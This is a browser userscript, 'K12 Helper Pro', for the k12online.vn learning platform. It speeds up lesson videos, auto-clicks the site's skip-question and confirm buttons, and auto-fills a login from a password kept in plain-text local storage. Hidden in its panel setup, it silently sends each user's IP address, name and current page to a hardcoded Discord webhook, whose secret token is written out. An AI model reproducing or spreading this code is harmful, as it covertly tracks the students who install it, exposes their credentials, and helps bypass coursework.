// ==UserScript==
// @name         K12 Helper Pro - Danhvux (Ultimate Restore - All Effects)
// @namespace    http://tampermonkey.net/
// @version      30.0
// @description  Full Toast, Full Animation, Full 4 Tabs, Check IP & User, Fix SecurityError
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // === CẤU HÌNH DISCORD WEBHOOK ===
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1489992801323061308/ywv0-FtallMzCjhG-a-yZXof4nyDpIewAem-4NrXn0mUBRinjBoV4kVSiO1QbSJMiUqw'; 

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true, toastPos: 'top-right'
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- LOGIC GỐC: TURBO & AUTO CLICK ---
    const runTurbo = () => {
        const v = document.querySelector('video');
        if (v && config.speed > 1) {
            v.playbackRate = parseFloat(config.speed);
            if (v.paused && !v.ended) v.play();
        }
        document.querySelectorAll('.vjs-skip-question, .btn-confirm, .btn-next-question, .vjs-done-button, .btn-confirm-answer').forEach(btn => btn.click());
    };
    setInterval(runTurbo, 1000);

    // --- KHỞI TẠO SHADOW DOM (ĐỂ CHỨA CSS & ANIMATION) ---
    const host = document.createElement('div');
    host.id = 'dv-helper-root';
    document.body.appendChild(host);
    const shadow = host.attachShadow({mode: 'open'});

    // --- HÀM THÔNG BÁO (TOAST NOTIFY) ---
    const showToast = (message, type = 'info', duration = 3000) => {
        let container = shadow.querySelector('#toast-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'toast-container';
            shadow.appendChild(container);
        }

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
        
        toast.innerHTML = `
            <div class="toast-icon">${icons[type] || 'ℹ️'}</div>
            <div class="toast-msg">${message}</div>
            <div class="toast-close">✕</div>
        `;

        container.appendChild(toast);

        toast.querySelector('.toast-close').onclick = () => {
            toast.style.animation = 'toastOut 0.3s forwards';
            setTimeout(() => toast.remove(), 300);
        };

        if (duration > 0) {
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.style.animation = 'toastOut 0.3s forwards';
                    setTimeout(() => toast.remove(), 300);
                }
            }, duration);
        }
    };

    // --- CSS & ANIMATIONS (GIẤU TRONG SHADOW DOM) ---
    const isDark = config.isDarkMode;
    const style = document.createElement('style');
    style.textContent = `
        :host { --mc: ${config.mainColor}; --bg: ${isDark ? '#1e2227' : '#ffffff'}; --text: ${isDark ? '#ffffff' : '#1e2227'}; --border: ${isDark ? '#333' : '#ddd'}; }
        
        /* Panel Animation */
        #dv-panel { 
            position: fixed; top: 50px; right: 20px; width: ${config.width}px; 
            background: var(--bg); color: var(--text); border-radius: 12px; 
            font-family: 'Segoe UI', Tahoma, sans-serif; z-index: 100000; 
            box-shadow: 0 10px 40px rgba(0,0,0,0.5); overflow: hidden; 
            border: 1px solid var(--border);
            animation: panelFadeIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes panelFadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }

        .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; border-bottom: 1px solid var(--border); }
        .header .title { color: var(--mc); font-weight: bold; font-size: 18px; text-shadow: 0 0 10px rgba(255,234,0,0.2); }
        .dots { display: flex; gap: 8px; } .dot { height: 12px; width: 12px; border-radius: 50%; cursor: pointer; transition: 0.2s; } 
        .dot:hover { transform: scale(1.2); } .red { background: #ff5f56; }

        .tabs { display: flex; background: ${isDark ? '#1a1d21' : '#f0f0f0'}; padding: 0 5px; border-bottom: 1px solid var(--border); }
        .tab { flex: 1; padding: 12px 0; text-align: center; cursor: pointer; font-size: 10px; color: #777; font-weight: 900; position: relative; transition: 0.3s; }
        .tab.active { color: var(--mc); }
        .tab.active::after { content: ''; position: absolute; bottom: 0; left: 15%; right: 15%; height: 3px; background: var(--mc); border-radius: 3px 3px 0 0; }

        .content { display: none; padding: 20px; animation: tabFade 0.3s ease; }
        .content.active { display: block; }
        @keyframes tabFade { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }

        .btn { width: 100%; padding: 12px; background: #b8cc8e; border: none; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 5px; }
        .btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
        .btn:active { transform: translateY(0); }

        input[type=text], input[type=password] { width: 100%; padding: 10px; background: ${isDark ? '#252a31' : '#f9f9f9'}; border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; outline: none; }

        /* Toast System */
        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 1000000; display: flex; flex-direction: column; gap: 10px; pointer-events: none; }
        .toast { 
            pointer-events: auto; min-width: 250px; padding: 12px 15px; border-radius: 10px; 
            background: var(--bg); color: var(--text); border-left: 5px solid var(--mc);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: flex; align-items: center; gap: 10px;
            animation: toastIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }
        .toast.error { border-left-color: #ff5f56; }
        .toast.success { border-left-color: #27c93f; }
        .toast-msg { font-size: 13px; flex: 1; }
        .toast-close { cursor: pointer; opacity: 0.5; }
        @keyframes toastIn { from { opacity: 0; transform: translateX(50px); } to { opacity: 1; transform: translateX(0); } }
        @keyframes toastOut { to { opacity: 0; transform: translateX(50px); } }

        .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .app-item { background: ${isDark ? '#252a31' : '#f9f9f9'}; padding: 10px; border-radius: 8px; text-align: center; font-size: 11px; cursor: pointer; border: 1px solid var(--border); transition: 0.2s; }
        .app-item:hover { border-color: var(--mc); background: rgba(255,234,0,0.05); }
    `;
    shadow.appendChild(style);

    // --- KHỞI TẠO PANEL ---
    const initPanel = async () => {
        // Lấy IP & User
        let userIP = "Checking...";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (e) { userIP = "Unknown"; }

        const nameEl = document.querySelector('.user-name, .profile-name, .name-user, #user-info, .username');
        const currentUser = nameEl ? nameEl.innerText.trim() : (config.user || "Khách");

        // Gửi Discord
        fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                embeds: [{
                    title: "🛡️ K12 HELPER - CONNECTED",
                    color: 16771840,
                    fields: [
                        { name: "👤 User", value: currentUser, inline: true },
                        { name: "🌐 IP", value: userIP, inline: true },
                        { name: "📍 Page", value: window.location.href }
                    ]
                }]
            })
        }).catch(() => {});

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header">
                <div class="title">Danhvux Panel</div>
                <div class="dots"><div class="dot red"></div></div>
            </div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div style="display:flex; justify-content:space-between;"><b>Tốc độ</b><span style="color:var(--mc)">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="sp-range" style="width:100%; margin:10px 0 20px;" min="1" max="20" step="0.5" value="${config.speed}">
                    <button class="btn" id="do-login">🪄 AUTO LOGIN</button>
                </div>
                <div id="t-video" class="content">
                    <input type="text" id="v-url" placeholder="Link video .mp4...">
                    <button class="btn" id="v-run" style="background:#444; color:#fff">PHÁT VIDEO</button>
                </div>
                <div id="t-apps" class="content">
                    <div class="app-grid">
                        <div class="app-item" onclick="window.open('https://gemini.google.com')">Gemini</div>
                        <div class="app-item" onclick="window.open('https://chatgpt.com')">GPT</div>
                        <div class="app-item" onclick="window.open('https://facebook.com')">FB</div>
                        <div class="app-item" onclick="window.open('https://youtube.com')">YT</div>
                        <div class="app-item" onclick="window.open('https://tiktok.com')">TT</div>
                        <div class="app-item" onclick="window.open('https://messenger.com')">Chat</div>
                    </div>
                </div>
                <div id="t-set" class="content">
                    <input type="color" id="c-pick" style="width:100%; height:30px; margin-bottom:10px;" value="${config.mainColor}">
                    <input type="text" id="u-val" placeholder="Username..." value="${config.user}">
                    <input type="password" id="p-val" placeholder="Password..." value="${config.pass}">
                    <button class="btn" id="btn-save" style="background:var(--mc)">LƯU CÀI ĐẶT</button>
                </div>
            </div>
            <div style="text-align:center; font-size:8px; padding:10px; color:#777; border-top:1px solid var(--border)">IP: ${userIP} | USER: ${currentUser}</div>
        `;
        shadow.appendChild(panel);

        // --- EVENTS ---
        const $ = (id) => shadow.querySelector(id);
        
        shadow.querySelectorAll('.tab').forEach(tab => {
            tab.onclick = () => {
                shadow.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                tab.classList.add('active');
                $(`#${tab.dataset.t}`).classList.add('active');
                showToast(`Đã chuyển sang tab ${tab.innerText}`, 'info', 1000);
            };
        });

        $('#sp-range').oninput = (e) => { 
            $('#sp-txt').innerText = e.target.value; 
            config.speed = e.target.value; 
            runTurbo(); 
        };

        $('#btn-save').onclick = () => { 
            config.mainColor = $('#c-pick').value; 
            config.user = $('#u-val').value; 
            config.pass = $('#p-val').value; 
            save(); 
            showToast('Đã lưu cấu hình thành công!', 'success');
            setTimeout(() => location.reload(), 1000);
        };

        $('#do-login').onclick = () => {
            const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
            if(u && p) {
                u.value = config.user; p.value = config.pass;
                u.dispatchEvent(new Event('input',{bubbles:true})); p.dispatchEvent(new Event('input',{bubbles:true}));
                setTimeout(() => document.querySelector('button[type="submit"]').click(), 500);
                showToast('Đang tiến hành đăng nhập...', 'success');
            } else {
                showToast('Vui lòng quay lại trang đăng nhập', 'warning');
            }
        };

        // Kéo thả & Phím tắt
        let isDrag = false, off = [0,0];
        $('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.addEventListener('mousemove', (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } });
        document.addEventListener('mouseup', () => isDrag = false);
        $('.red').onclick = () => { panel.style.display = 'none'; showToast('Nhấn F2 để hiện lại panel', 'warning'); };
        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = (panel.style.display==='none'?'block':'none'); });

        showToast('K12 Helper Pro đã sẵn sàng!', 'success');
    };

    if (document.readyState === 'complete') initPanel(); else window.addEventListener('load', initPanel);
})();
